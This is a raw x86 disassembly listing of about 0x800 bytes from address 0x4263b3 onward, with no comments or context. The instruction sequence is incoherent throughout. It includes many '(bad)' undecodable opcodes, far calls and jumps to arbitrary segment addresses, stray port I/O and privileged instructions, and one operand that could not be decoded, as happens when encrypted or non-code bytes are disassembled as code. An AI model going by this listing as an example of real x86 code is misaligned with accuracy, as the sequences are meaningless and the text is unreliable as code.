  4263b3:	int    0xbd
  4263b5:	loope  0x4263db
  4263b7:	shl    DWORD PTR ds:0x4dc0630b,cl
  4263bd:	push   cs
  4263be:	inc    esp
  4263bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4263c0:	fsubr  QWORD PTR [ebx-0x7f7cef1d]
  4263c6:	inc    edx
  4263c7:	add    eax,0x94758cb2
  4263cc:	shl    DWORD PTR ds:0xbccf1e8,cl
  4263d2:	add    DWORD PTR [esi],esp
  4263d4:	jo     0x4263d2
  4263d6:	dec    edx
  4263d7:	push   ecx
  4263d8:	jecxz  0x426428
  4263da:	call   0x1a46:0x3620c3b
  4263e1:	ins    BYTE PTR es:[edi],dx
  4263e2:	pusha  
  4263e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4263e4:	dec    ecx
  4263e5:	outs   dx,BYTE PTR ds:[esi]
  4263e6:	gs scas al,BYTE PTR es:[edi]
  4263e8:	sahf   
  4263e9:	jmp    0x70f50209
  4263ee:	mov    dl,0x1c
  4263f0:	loope  0x4263d8
  4263f2:	mov    eax,ds:0xe6343c36
  4263f7:	inc    eax
  4263f8:	(bad)  
  4263f9:	(bad)  
  4263fa:	call   0x4fec:0x8786b700
  426401:	rcr    DWORD PTR [ebp+0xbf20ef9],1
  426407:	pop    DWORD PTR [edx+0x6474d93b]
  42640d:	or     ebp,DWORD PTR [ebp-0x63]
  426410:	and    BYTE PTR [di-0x30],dl
  426414:	push   0xffffffce
  426416:	call   0xda46:0x5930f6a9
  42641d:	lods   eax,DWORD PTR ds:[esi]
  42641e:	pushf  
  42641f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426420:	xchg   ecx,eax
  426421:	pusha  
  426422:	mov    BYTE PTR [ecx+0x10],bh
  426425:	xchg   ebp,eax
  426426:	sbb    BYTE PTR fs:[edx+0x32fcf6c0],dh
  42642d:	data16 int3 
  42642f:	inc    esp
  426430:	add    eax,0x15a07cf1
  426435:	mov    bh,0xf
  426437:	ins    DWORD PTR es:[edi],dx
  426438:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426439:	mov    ebp,DWORD PTR [eax-0x65890ffb]
  42643f:	cmc    
  426440:	and    eax,0x79f9ce5a
  426445:	imul   esp,DWORD PTR cs:[edi+0x785af7c2],0xfecc8f60
  426450:	mov    dl,0x1f
  426452:	setge  BYTE PTR [ecx]
  426455:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426456:	inc    ecx
  426457:	pop    ebp
  426458:	push   ebp
  426459:	or     ebx,ebx
  42645b:	pop    edi
  42645c:	fild   WORD PTR [edx]
  42645e:	jecxz  0x426415
  426460:	xchg   esi,eax
  426461:	mov    ds,WORD PTR [edx+0x46d4bf42]
  426467:	in     eax,0x79
  426469:	sbb    eax,0x930fa0e9
  42646e:	or     BYTE PTR [edx],0x33
  426471:	retf   
  426472:	imul   edx,DWORD PTR [edx],0x6
  426475:	and    DWORD PTR [edx+0x4a712443],ebx
  42647b:	jmp    0xbb4b644c
  426480:	scas   eax,DWORD PTR es:[edi]
  426481:	xor    eax,0xd5d227a3
  426486:	shl    eax,0xa
  426489:	add    al,0x9b
  42648b:	add    DWORD PTR [esi+0x582b6bf8],ecx
  426491:	or     DWORD PTR [edx-0x56],0xfffffff2
  426495:	adc    eax,0x8b7a0a9c
  42649a:	js     0x4264f9
  42649c:	dec    esi
  42649d:	push   ds
  42649e:	mov    eax,ds:0x534fb278
  4264a3:	cmp    dl,cl
  4264a5:	pop    ebx
  4264a6:	rol    DWORD PTR [edi+0x9],1
  4264a9:	or     al,0x0
  4264ab:	stos   DWORD PTR es:[edi],eax
  4264ac:	adc    edx,DWORD PTR [ebx-0x7447c818]
  4264b2:	mov    ah,0xe0
  4264b4:	mov    dl,0xc0
  4264b6:	mov    ch,0x9
  4264b8:	fdivr  DWORD PTR [eax]
  4264ba:	fist   DWORD PTR [edi]
  4264bc:	adc    al,0xf1
  4264be:	enter  0xb4ae,0x26
  4264c2:	out    dx,al
  4264c3:	sub    eax,0x67c5be32
  4264c8:	stos   DWORD PTR es:[edi],eax
  4264c9:	ins    DWORD PTR es:[edi],dx
  4264ca:	call   0x9279:0x719b6f64
  4264d1:	mov    cl,0x88
  4264d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4264d4:	adc    edx,DWORD PTR [edi+edi*4+0x5800c7e5]
  4264db:	in     al,0x54
  4264dd:	test   eax,0xcf800b9a
  4264e2:	lea    edx,[eax-0x5863f1c1]
  4264e8:	push   ecx
  4264e9:	mov    ebx,0x1a2f2dd4
  4264ee:	xchg   esi,eax
  4264ef:	or     al,0xb2
  4264f1:	cld    
  4264f2:	div    BYTE PTR [edi]
  4264f4:	imul   esi,ebx,0x1d12d659
  4264fa:	lods   eax,DWORD PTR ds:[esi]
  4264fb:	lea    ebp,ds:0xbb272317
  426501:	pop    ebx
  426502:	fld    QWORD PTR [ebx+eiz*2+0x6f]
  426506:	call   0xc06b:0x4db5ba1d
  42650d:	push   ebp
  42650e:	dec    ecx
  42650f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426510:	jne    0x4264f6
  426512:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426513:	or     al,0xb5
  426515:	mov    WORD PTR [eax],?
  426517:	sbb    al,0xb2
  426519:	shl    DWORD PTR [esp+eax*2-0x7a417d93],0x30
  426521:	or     eax,DWORD PTR [ecx+edi*1-0x3d3b0690]
  426528:	lds    eax,FWORD PTR [ebx]
  42652a:	call   0x5ffb:0xc743ce2
  426531:	xor    ah,BYTE PTR fs:[edi+0x62af84c9]
  426538:	pushf  
  426539:	mov    dh,0x8c
  42653b:	sar    DWORD PTR [eax+eiz*8-0x169ac37e],1
  426542:	fiadd  DWORD PTR [edi+0x47556ba9]
  426548:	repz or edx,DWORD PTR [ecx+ebx*8]
  42654c:	or     al,0x22
  42654e:	and    cl,al
  426550:	retf   0x9a1b
  426553:	xor    DWORD PTR [eax+0x33644751],esi
  426559:	xor    eax,0xb39d833
  42655e:	pop    edx
  42655f:	scas   al,BYTE PTR es:[edi]
  426560:	stos   BYTE PTR es:[edi],al
  426561:	sub    eax,0x9d12a154
  426566:	mov    eax,ds:0x8f8b45d3
  42656b:	add    bl,dh
  42656d:	mov    bl,0xe5
  42656f:	push   ss
  426570:	lds    ecx,FWORD PTR [ebx]
  426572:	push   ss
  426573:	pop    edi
  426574:	push   ecx
  426575:	inc    ecx
  426576:	sar    DWORD PTR [edx],0x49
  426579:	jmp    0x27f02619
  42657e:	(bad)  
  42657f:	mov    ebx,0x48aa8de1
  426584:	dec    edi
  426585:	add    al,0x5d
  426587:	mov    ds:0x79bafdc7,eax
  42658c:	push   0xa4582023
  426591:	pusha  
  426592:	xor    DWORD PTR [edi-0x4e],esp
  426595:	mov    bh,0x4a
  426597:	es pop ss
  426599:	jle    0x42660e
  42659b:	mov    al,ds:0xef512654
  4265a0:	push   0xb
  4265a2:	xlat   BYTE PTR ds:[ebx]
  4265a3:	xlat   BYTE PTR ds:[ebx]
  4265a4:	xchg   edx,eax
  4265a5:	aaa    
  4265a6:	call   0xe8f0:0x657f1a82
  4265ad:	mov    ds:0x306ca755,al
  4265b2:	add    al,0x76
  4265b4:	dec    esi
  4265b5:	xchg   edx,eax
  4265b6:	pop    edi
  4265b7:	into   
  4265b8:	mov    ebp,0x18ef064d
  4265bd:	stos   DWORD PTR es:[edi],eax
  4265be:	sub    al,0x25
  4265c1:	js     0x42659b
  4265c3:	mov    eax,0xa7b6ac4c
  4265c8:	dec    ecx
  4265c9:	(bad)  
  4265ca:	pusha  
  4265cb:	stos   DWORD PTR es:[edi],eax
  4265cc:	pop    es
  4265cd:	cdq    
  4265ce:	cwde   
  4265cf:	xchg   edi,eax
  4265d0:	sbb    bh,BYTE PTR ds:[eax]
  4265d3:	dec    ebp
  4265d4:	fcmove st,st(3)
  4265d6:	ins    BYTE PTR es:[edi],dx
  4265d7:	adc    eax,0xc1ce0bd5
  4265dc:	fadd   QWORD PTR [eax]
  4265de:	xor    BYTE PTR ds:0x119a33ee,bh
  4265e4:	mov    edx,0xf0cb7219
  4265e9:	mov    edi,0xa4abba4d
  4265ee:	cmp    al,0xa6
  4265f0:	xchg   esi,eax
  4265f1:	cdq    
  4265f2:	sbb    al,0xda
  4265f4:	std    
  4265f5:	imul   ebp,DWORD PTR ds:0x77b3ac,0x41
  4265fc:	inc    DWORD PTR [ebp+esi*1+0x2a3b7e43]
  426603:	mov    cl,0x8e
  426605:	sub    DWORD PTR [esi],0x1d
  426608:	mov    dl,0x98
  42660a:	cmp    dh,BYTE PTR [ebp+0xb]
  42660d:	inc    edx
  42660e:	xor    al,0xa7
  426610:	mov    cl,0x1f
  426612:	ds scas al,BYTE PTR es:[edi]
  426614:	fild   WORD PTR [eax+ecx*4]
  426617:	dec    esi
  426618:	mov    DWORD PTR [edi],edx
  42661a:	test   al,0x27
  42661c:	es jmp 0x885bbf71
  426622:	leave  
  426623:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426624:	popa   
  426625:	and    edi,DWORD PTR [ebx-0x5ae5c7d7]
  42662b:	imul   esi,DWORD PTR [edx+0xb137550],0x6805f582
  426635:	or     bh,BYTE PTR [ebx+0xb]
  426638:	sub    eax,0x5e4fd059
  42663d:	in     al,0x39
  42663f:	out    0x78,al
  426641:	push   ebx
  426642:	fcmovu st,st(0)
  426644:	mov    ebp,esp
  426646:	call   0xf9ea:0x28cd8cf9
  42664d:	xchg   edx,eax
  42664e:	xlat   BYTE PTR fs:[ebx]
  426650:	mov    al,0xb
  426652:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426653:	add    edi,DWORD PTR [esi]
  426655:	icebp  
  426656:	jle    0x42663f
  426658:	es pop ebp
  42665a:	fwait
  42665b:	cld    
  42665c:	mov    ebx,0x9fc130b5
  426661:	stos   DWORD PTR es:[edi],eax
  426662:	dec    esi
  426663:	adc    bl,ah
  426665:	or     edx,DWORD PTR [ebx]
  426667:	(bad)  
  426668:	push   ds
  426669:	test   BYTE PTR [ebx],al
  42666b:	push   0xffffffd8
  42666d:	xor    edx,DWORD PTR [ebp+0x6b3d6873]
  426673:	(bad)  
  426674:	xor    edi,ebp
  426676:	clc    
  426677:	pop    esi
  426678:	lea    eax,[ecx]
  42667a:	push   0x34f4a900
  42667f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426680:	xchg   ebx,eax
  426681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426682:	mov    ds:0x85a8dc5d,al
  426687:	cs dec edi
  426689:	sbb    eax,0x92964fda
  42668e:	fnstsw WORD PTR [ecx+0x727f0872]
  426694:	mov    ds:0x5aaf1e9b,eax
  426699:	cli    
  42669a:	adc    BYTE PTR [edi],cl
  42669c:	mov    dl,0x5e
  42669e:	repnz int3 
  4266a0:	cld    
  4266a1:	fsubr  DWORD PTR [ecx+0x19344a66]
  4266a7:	push   esp
  4266a8:	xor    dh,BYTE PTR [esi-0x62]
  4266ab:	rcl    DWORD PTR [esp+edx*4-0x534d1ac2],0xe3
  4266b3:	loope  0x426658
  4266b5:	adc    ch,ah
  4266b7:	add    dl,BYTE PTR [ebp+0xb]
  4266ba:	mov    ch,0x7d
  4266bc:	jmp    0xfa3115e9
  4266c1:	(bad)  
  4266c2:	mov    ah,0x66
  4266c4:	mov    bl,0x25
  4266c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4266c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266c8:	sbb    al,dh
  4266ca:	add    edi,eax
  4266cc:	fbstp  TBYTE PTR [edx+0xb2ddc58]
  4266d2:	clc    
  4266d3:	aaa    
  4266d4:	rcl    esi,cl
  4266d6:	bound  ebp,QWORD PTR [ebp-0x555b5f9d]
  4266dc:	jbe    0x42675b
  4266de:	call   0x954e:0x1d3e2b3d
  4266e5:	and    al,0x61
  4266e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266e8:	in     al,dx
  4266e9:	cs jb  0x426680
  4266ec:	push   ebp
  4266ed:	mov    bh,0x81
  4266ef:	aam    0xb2
  4266f1:	dec    edx
  4266f2:	jp     0x42672b
  4266f4:	push   edi
  4266f5:	inc    ebx
  4266f6:	mov    ebp,DWORD PTR ds:0x25970b69
  4266fc:	lahf   
  4266fd:	dec    esp
  4266fe:	fldenv [ecx+0x77]
  426701:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426702:	call   0x9373:0xff7b7102
  426709:	ds sub eax,0x6dd9bda6
  42670f:	iret   
  426710:	in     eax,0xd
  426712:	push   esp
  426713:	xchg   edi,eax
  426714:	or     dh,bl
  426716:	call   0xd0fa:0xac82f935
  42671d:	xor    bl,ah
  42671f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426720:	xor    DWORD PTR [eax],ebp
  426722:	xor    al,0xd0
  426724:	push   es
  426725:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426726:	pop    es
  426727:	mov    dh,BYTE PTR [edx-0x4ff33594]
  42672d:	inc    esp
  42672e:	sbb    al,0x80
  426730:	mov    ds:0x29984d0b,al
  426735:	xchg   ecx,eax
  426736:	sti    
  426737:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426738:	and    al,0xe9
  42673a:	call   0xb911:0x2effb406
  426741:	test   al,0x45
  426743:	sahf   
  426744:	sar    BYTE PTR ds:0xe2a0,0xc
  42674a:	fidivr WORD PTR [ecx]
  42674c:	sub    DWORD PTR [ebx],ecx
  42674e:	lds    ecx,FWORD PTR [edi]
  426750:	pop    esi
  426751:	cmp    al,0x99
  426753:	or     al,0x1c
  426755:	inc    ebp
  426756:	and    BYTE PTR [edx+0x11d7f317],0x2a
  42675d:	or     DWORD PTR [edx],ebx
  42675f:	std    
  426760:	ffreep st(4)
  426762:	fadd   st(1),st
  426764:	jb     0x426763
  426766:	fsubr  DWORD PTR [ebp-0x6225694d]
  42676c:	outs   dx,DWORD PTR ds:[esi]
  42676d:	dec    eax
  42676e:	es out dx,al
  426770:	dec    esi
  426771:	sar    ebx,0xa7
  426774:	repz add ebx,DWORD PTR [ebp-0x57818a2a]
  42677b:	push   esp
  42677c:	mov    esp,0x99090a14
  426781:	sub    ebp,ebp
  426783:	(bad)  ds:0xaa7de29
  426789:	pop    esp
  42678a:	push   es
  42678b:	imul   esi,edi,0xb239bdcd
  426791:	or     ecx,ebp
  426793:	cwde   
  426794:	sub    esp,eax
  426796:	add    BYTE PTR [ebx-0x4c],ah
  426799:	or     ebp,DWORD PTR [ecx]
  42679b:	lea    eax,[ebx*2+0x27e50ff]
  4267a2:	mov    dl,0x30
  4267a4:	das    
  4267a5:	aam    0xe3
  4267a7:	loopne 0x42675b
  4267a9:	mov    edx,0xdf1a882d
  4267ae:	mov    WORD PTR [edx-0x2ce7e983],cs
  4267b4:	pop    ebx
  4267b5:	dec    ebx
  4267b6:	sbb    al,0x6f
  4267b8:	popa   
  4267b9:	sar    BYTE PTR [edi],cl
  4267bb:	test   BYTE PTR [eax+0x34],dl
  4267be:	cdq    
  4267bf:	mov    eax,ds:0x5c0bd327
  4267c4:	xchg   esi,eax
  4267c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4267c6:	popa   
  4267c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4267c8:	push   edx
  4267c9:	pop    ds
  4267ca:	out    dx,al
  4267cb:	aad    0x1f
  4267cd:	mov    ds:0x9d9ac29a,al
  4267d2:	sub    DWORD PTR [eax+eax*1-0x6758c208],0xd1c7b109
  4267dd:	icebp  
  4267de:	pop    esi
  4267df:	adc    BYTE PTR [edx-0x76b1d5a4],dh
  4267e5:	repz sub DWORD PTR [edi-0x69],0xb
  4267ea:	push   0x661691aa
  4267ef:	int    0x12
  4267f1:	xchg   ebp,eax
  4267f2:	xchg   DWORD PTR [edx],ecx
  4267f4:	adc    DWORD PTR [edi+0x21],ebp
  4267f7:	daa    
  4267f8:	xor    esi,DWORD PTR [edi-0x5a]
  4267fb:	sahf   
  4267fc:	jge    0x42678b
  4267fe:	push   0x79cf46a9
  426803:	aas    
  426804:	repnz mov ch,0xd6
  426807:	pop    edx
  426808:	arpl   WORD PTR [esi],dx
  42680a:	mov    eax,ds:0xc20b0434
  42680f:	xchg   BYTE PTR [ebx],bh
  426811:	pop    ebp
  426812:	loopne 0x426808
  426814:	add    cl,BYTE PTR [ebx]
  426816:	pop    ebp
  426817:	xor    al,BYTE PTR [eax+0x72]
  42681a:	in     al,0x75
  42681c:	popf   
  42681d:	cld    
  42681e:	jge    0x4267b7
  426820:	scas   eax,DWORD PTR es:[edi]
  426821:	cli    
  426822:	call   0x123:0xc7a1640a
  426829:	mov    dl,0xb1
  42682b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42682c:	or     bh,BYTE PTR [ebx]
  42682e:	push   edx
  42682f:	enter  0x1f60,0x61
  426833:	in     eax,0x22
  426835:	jne    0x4267d1
  426837:	popa   
  426838:	mul    edx
  42683a:	jb     0x42680c
  42683c:	sub    BYTE PTR [esi+0x47f4a70a],0xb9
  426843:	pop    esi
  426844:	mov    bl,0x9a
  426846:	fistp  DWORD PTR [edx+esi*4]
  426849:	mov    esi,0xdd1c293
  42684e:	jecxz  0x426817
  426850:	push   ebx
  426851:	or     ebp,DWORD PTR [esp+edx*2-0x3d]
  426855:	push   edi
  426856:	cld    
  426857:	call   0xbdb2:0x10ecb4a7
  42685e:	retf   
  42685f:	lods   eax,DWORD PTR ds:[esi]
  426860:	jne    0x426822
  426862:	das    
  426863:	mov    esi,esi
  426865:	adc    ebp,DWORD PTR [ebx]
  426867:	add    al,0xa1
  426869:	dec    edi
  42686a:	jmp    0xeba9f0f2
  42686f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426870:	stos   DWORD PTR es:[edi],eax
  426871:	ss mov al,0x27
  426874:	scas   eax,DWORD PTR es:[edi]
  426875:	data16 cld 
  426877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426878:	iret   
  426879:	mov    ebx,0x7d0b73c8
  42687e:	ins    DWORD PTR es:[edi],dx
  42687f:	out    dx,al
  426880:	mov    ebp,0x1fe4065b
  426885:	jbe    0x426861
  426887:	pop    eax
  426888:	sbb    edi,edx
  42688a:	(bad)
  42688d:	pop    ss
  42688e:	nop
  42688f:	(bad)  
  426890:	push   bp
  426892:	in     eax,dx
  426893:	daa    
  426894:	outs   dx,BYTE PTR ds:[esi]
  426895:	stc    
  426896:	test   DWORD PTR ds:0x16860f97,ecx
  42689c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42689d:	cmp    ebx,edx
  42689f:	push   es
  4268a0:	and    esp,esi
  4268a2:	in     al,0xac
  4268a4:	test   DWORD PTR [ebx],ecx
  4268a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4268a7:	xor    esp,DWORD PTR [ebp-0x31df5fa]
  4268ad:	mov    ebp,0xff01079a
  4268b2:	fxch   st(6)
  4268b4:	dec    edi
  4268b5:	xorps  xmm4,XMMWORD PTR [eax-0x7c3d271c]
  4268bc:	mov    ebp,0x62241a94
  4268c1:	int    0x13
  4268c3:	add    DWORD PTR [edx+0x44a31634],esi
  4268c9:	dec    edx
  4268ca:	cmp    bh,dh
  4268cc:	xchg   ebx,eax
  4268cd:	or     dh,BYTE PTR [edi*8+0x8a0d8f6]
  4268d4:	inc    edx
  4268d5:	jp     0x4268c9
  4268d7:	inc    ebx
  4268d8:	rcr    DWORD PTR [eax],cl
  4268da:	fwait
  4268db:	lods   al,BYTE PTR ds:[esi]
  4268dc:	jae    0x4268e3
  4268de:	(bad)  
  4268e0:	js     0x4268a6
  4268e2:	inc    edx
  4268e3:	pop    esp
  4268e4:	leave  
  4268e5:	sbb    edi,edx
  4268e7:	sub    eax,0xe3e50b84
  4268ec:	or     BYTE PTR [ecx],0xce
  4268ef:	scas   eax,DWORD PTR es:[edi]
  4268f0:	mov    dl,0x32
  4268f2:	jmp    0xa2a3:0x2c23ec3
  4268f9:	ss das 
  4268fb:	retf   0xadb2
  4268fe:	push   0x78
  426900:	adc    BYTE PTR [esi+0x1b],bl
  426903:	imul   ebx,DWORD PTR [ebp+0x5e7fc870],0x8dfb9d0b
  42690d:	xchg   ebx,eax
  42690e:	jmp    0x9b3f0227
  426913:	(bad)  
  426914:	cmc    
  426915:	aad    0xd7
  426917:	stos   DWORD PTR es:[edi],eax
  426918:	push   0xb1a7e4e7
  42691d:	or     al,0xa9
  42691f:	add    al,0xfd
  426921:	adc    BYTE PTR [eax-0x7a],bl
  426924:	mov    dl,0x19
  426926:	stos   BYTE PTR es:[edi],al
  426927:	dec    ebp
  426928:	xor    dh,ch
  42692a:	and    bh,BYTE PTR [edx+0xc160bf3]
  426930:	shr    BYTE PTR ds:0x4974eef4,0x95
  426937:	test   DWORD PTR [ecx-0x37],eax
  42693a:	add    BYTE PTR [eax-0x58],0x9b
  42693e:	dec    ebx
  42693f:	out    dx,eax
  426940:	add    DWORD PTR [eax+0xba3064a],0xf3b53ad0
  42694a:	fcmove st,st(7)
  42694c:	in     eax,dx
  42694d:	in     eax,dx
  42694e:	call   0xd:0xef77344a
  426955:	xchg   ecx,eax
  426956:	frstor [edi-0x5dba3df7]
  42695c:	test   eax,0xb2c0a165
  426961:	cmp    DWORD PTR [ebp-0x74],ebx
  426964:	fbstp  TBYTE PTR [esi-0x12d64149]
  42696a:	adc    esp,DWORD PTR [edi+0x5292369b]
  426970:	cwde   
  426971:	repz sbb esp,DWORD PTR [edx-0x4e]
  426975:	popa   
  426976:	mov    ah,al
  426978:	js     0x4269ed
  42697a:	popf   
  42697b:	mov    bh,BYTE PTR [ebx+0xb]
  42697e:	xor    eax,0xbbb3280e
  426983:	sbb    DWORD PTR [esi],0xf8299429
  426989:	push   ecx
  42698a:	int3   
  42698b:	pop    es
  42698c:	xchg   edi,eax
  42698d:	aad    0xa9
  42698f:	and    dl,BYTE PTR [edx+ecx*1]
  426992:	xor    dh,0x5d
  426995:	fsub   DWORD PTR [ebp-0x3f]
  426998:	test   DWORD PTR ds:[ebx-0x41084d75],0xabb958a1
  4269a3:	xor    BYTE PTR [eax+0x3405130b],ch
  4269a9:	cmc    
  4269aa:	int    0xc5
  4269ac:	bound  edx,QWORD PTR [esi]
  4269ae:	call   0x4f3a:0x5b6ab56f
  4269b5:	dec    ebp
  4269b6:	xchg   ecx,eax
  4269b7:	test   eax,0xf48c6247
  4269bc:	cmp    al,0x63
  4269be:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4269c0:	test   DWORD PTR [ebx+0x34c2d510],ebx
  4269c6:	xchg   esp,eax
  4269c7:	retf   0xaf5a
  4269ca:	jo     0x426a13
  4269cc:	jle    0x426a46
  4269ce:	out    0xf8,eax
  4269d0:	push   eax
  4269d1:	or     edx,DWORD PTR [eax-0x1e]
  4269d4:	loope  0x4269f9
  4269d6:	punpcklbw mm1,DWORD PTR [edi]
  4269d9:	xor    BYTE PTR [esi+0x59363389],al
  4269df:	(bad)  
  4269e0:	stos   BYTE PTR es:[edi],al
  4269e1:	test   eax,0x898ca70e
  4269e6:	xor    ebx,ecx
  4269e8:	clc    
  4269e9:	and    BYTE PTR ds:0xe7b240,0xb4
  4269f0:	inc    ecx
  4269f1:	add    ch,BYTE PTR [edi+0x40cb9ad]
  4269f7:	mov    ds,WORD PTR [ebp+0x2c]
  4269fa:	outs   dx,DWORD PTR ds:[esi]
  4269fb:	addr16 xchg edi,eax
  4269fd:	cwde   
  4269fe:	sbb    dh,BYTE PTR [ecx+0x1d53d3bc]
  426a04:	ret    
  426a05:	mov    ebp,DWORD PTR [esi]
  426a07:	or     eax,0xa7236838
  426a0c:	test   BYTE PTR [ecx],bl
  426a0e:	fimul  DWORD PTR [ebp+0x78a8f840]
  426a14:	mov    cl,0xff
  426a16:	xlat   BYTE PTR ds:[ebx]
  426a17:	fsub   st(7),st
  426a19:	mov    edx,0x3d933f0b
  426a1e:	adc    ah,BYTE PTR [edi-0x3ade9a3f]
  426a24:	sbb    DWORD PTR [ebx+0x2c],edi
  426a27:	jo     0x4269db
  426a29:	std    
  426a2a:	mov    ebp,0x7e504a2a
  426a2f:	mov    cl,cl
  426a31:	xor    BYTE PTR [eax+ebx*4],al
  426a34:	xor    cl,BYTE PTR [ecx-0x6c]
  426a37:	das    
  426a38:	bound  ebx,QWORD PTR ds:0xf6b219dc
  426a3e:	sub    DWORD PTR [ebx-0x7f],0xffffffcc
  426a42:	mov    edi,0x340baa21
  426a47:	mov    BYTE PTR [esi],ch
  426a49:	push   0x47ed952b
  426a4e:	popf   
  426a4f:	xor    esp,DWORD PTR [edx-0x56]
  426a52:	int    0x53
  426a54:	xchg   edx,eax
  426a55:	outs   dx,BYTE PTR ds:[esi]
  426a56:	dec    ebx
  426a57:	add    eax,0xa7697283
  426a5c:	mov    bh,0x89
  426a5e:	ret    0x4357
  426a61:	inc    esi
  426a62:	adc    al,BYTE PTR [eax-0x4f]
  426a65:	lahf   
  426a66:	mov    dh,BYTE PTR [ebp+0x8]
  426a69:	xchg   esp,eax
  426a6a:	xchg   ecx,eax
  426a6b:	pop    es
  426a6c:	sub    al,0x5a
  426a6e:	frstor [esp+edx*1-0xb9d55ca]
  426a75:	cli    
  426a76:	push   edx
  426a77:	jecxz  0x426a70
  426a79:	lods   al,BYTE PTR ds:[esi]
  426a7a:	call   0x87c6:0x95cdd234
  426a81:	jns    0x426ae5
  426a83:	scas   al,BYTE PTR es:[edi]
  426a84:	cs push eax
  426a86:	push   ebp
  426a87:	add    al,0x31
  426a89:	xlat   BYTE PTR ds:[ebx]
  426a8a:	mov    esp,0xb38b5d44
  426a8f:	fwait
  426a90:	xor    BYTE PTR [esp+edx*4],ch
  426a93:	fimul  DWORD PTR [edx-0x3a]
  426a96:	aam    0xa7
  426a98:	mov    al,0x1
  426a9a:	push   cs
  426a9b:	inc    edx
  426a9c:	jl     0x426aa9
  426a9e:	jns    0x426a95
  426aa0:	test   al,0x8e
  426aa2:	lock mov dh,0x4e
  426aa5:	clc    
  426aa6:	call   0x4610:0x3b80a292
  426aad:	test   eax,0xcb2ea7c3
  426ab2:	adc    BYTE PTR [edx+0x226a4cc0],ah
  426ab8:	rcr    BYTE PTR [esi+0x64],0xa
  426abc:	int3   
  426abd:	rcr    BYTE PTR [edx+0x266a1a5d],cl
  426ac3:	mov    esi,0xd3240dac
  426ac8:	out    0xb,al
  426aca:	retf   0x2f9d
  426acd:	ja     0x426a58
  426acf:	in     al,0xf6
  426ad1:	js     0x426b43
  426ad3:	xor    BYTE PTR [edx+0x71b39092],0x54
  426ada:	aam    0x43
  426adc:	mov    al,ds:0xeadfcd0b
  426ae1:	mov    ds:0x2578143b,eax
  426ae6:	call   0xa29:0x68c4d5ab
  426aed:	int    0x2
  426aef:	(bad)  
  426af0:	push   esp
  426af1:	add    al,0x4b
  426af3:	test   bh,0x3e
  426af6:	jp     0x426b57
  426af8:	ja     0x426b0f
  426afa:	inc    edi
  426afb:	mov    cs,WORD PTR [ecx+0x4eb8bfc8]
  426b01:	test   eax,0x2c43531a
  426b06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b07:	or     DWORD PTR [esp+edx*1+0x1a],0xffffffb2
  426b0c:	out    dx,eax
  426b0d:	or     bh,BYTE PTR [ecx]
  426b0f:	mov    bh,0x58
  426b11:	jmp    0xd1a1c235
  426b16:	call   0xd008:0x6c4edf2f
  426b1d:	push   eax
  426b1e:	fwait
  426b1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b20:	cmp    eax,0xedeb7c10
  426b25:	xchg   ecx,eax
  426b26:	addr16 push ebx
  426b28:	add    eax,0xd9a49d8a
  426b2d:	jmp    0x3bd539db
  426b32:	arpl   WORD PTR [edx+0x7],bp
  426b35:	or     eax,DWORD PTR [ecx+0x5ed5d2a3]
  426b3b:	add    ebp,edx
  426b3d:	xchg   edi,eax
  426b3e:	bound  eax,QWORD PTR [edi+0x5c]
  426b41:	dec    eax
  426b42:	call   0x62fc:0x68625d14
  426b49:	pop    eax
  426b4a:	adc    al,0xa7
  426b4c:	mov    ebp,0x86e94d4b
  426b51:	mov    ds:0x89ae9754,al
  426b56:	std    
  426b57:	cmp    BYTE PTR [ebp+0x3],dh
  426b5a:	mov    eax,ds:0xd955c218
  426b5f:	push   ss
  426b60:	outs   dx,DWORD PTR ds:[esi]
  426b61:	or     bh,BYTE PTR [ebp+ebp*4+0x3b0b3d88]
  426b68:	sahf   
  426b69:	sti    
  426b6a:	test   al,0xdd
  426b6c:	mov    dl,0x47
  426b6e:	or     eax,0xc941350d
  426b73:	test   eax,0xac1e0bae
  426b78:	mov    bl,0x9b
  426b7a:	sub    ah,BYTE PTR [ebp+0x27e3cda4]
  426b80:	mov    dl,0x59
  426b82:	push   eax
  426b83:	inc    edx
  426b84:	call   0x7c6b:0xf9cfb172
  426b8b:	test   DWORD PTR [edi-0x4d5c2318],ebp
  426b91:	in     al,dx
  426b92:	(bad)  
  426b94:	addr16 xchg ebp,eax
  426b96:	iret   
  426b97:	adc    edi,DWORD PTR [eax-0x15]
  426b9a:	stos   BYTE PTR es:[edi],al
  426b9b:	fsub   DWORD PTR [ebx+ecx*1+0x4a211124]
  426ba2:	fst    QWORD PTR [esi]
  426ba4:	or     eax,0x241c9a54
  426ba9:	or     eax,0x1a899e68
  426bae:	in     eax,0xa7
  426bb0:	jno    0x426b5d
  426bb2:	add    eax,0xae340be2
  426bb7:	push   edx
  426bb8:	inc    esi
